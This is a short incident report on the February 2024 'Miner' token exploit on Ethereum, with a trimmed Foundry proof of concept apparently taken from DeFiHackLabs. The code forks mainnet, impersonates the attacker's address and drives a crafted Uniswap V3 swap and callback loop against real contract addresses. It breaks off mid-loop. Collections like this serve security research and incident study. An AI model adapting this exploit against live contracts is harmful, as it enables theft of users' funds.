# [?] Miner - lack of validation dst address

## Summary
Severity: Unknown
Chain: Ethereum
Component: Miner
Published: 2024-02-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Miner_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~150k
References:
- https://twitter.com/Phalcon_xyz/status/1757777340002681326

```solidity
contract ContractTest is Test {
    address attacker = 0xea75AeC151f968b8De3789CA201a2a3a7FaeEFbA;
    IMinerUNIV3POOL pool = IMinerUNIV3POOL(0x732276168b421D4792E743711E1A48172EA574a2);
    IMiner MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // evm_version Requires to be "shanghai"
        cheats.createSelectFork("mainnet", 19_226_508 - 1);
        cheats.label(address(MINER), "MINER");
        cheats.label(address(pool), "MINER_Pool");
        cheats.label(address(WETH), "WETH");
    }

    function testExploit() public {
        emit log_named_uint("Attacker ETH balance before exploit", WETH.balanceOf(address(this)));
        cheats.startPrank(attacker);
        MINER.transfer(address(this), MINER.balanceOf(attacker));
        MINER.balanceOf(address(this));
        cheats.stopPrank();

        bool zeroForOne = false;
        int256 amountSpecified = 999_999_999_999_999_998_000;
        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
        bytes memory data = abi.encodePacked(uint8(0x61));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
        emit log_named_uint("Attacker ETH balance affter exploit", WETH.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        MINER.balanceOf(address(this));
        for (uint256 i = 0; i < 2000; i++) {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Miner_exp.sol_
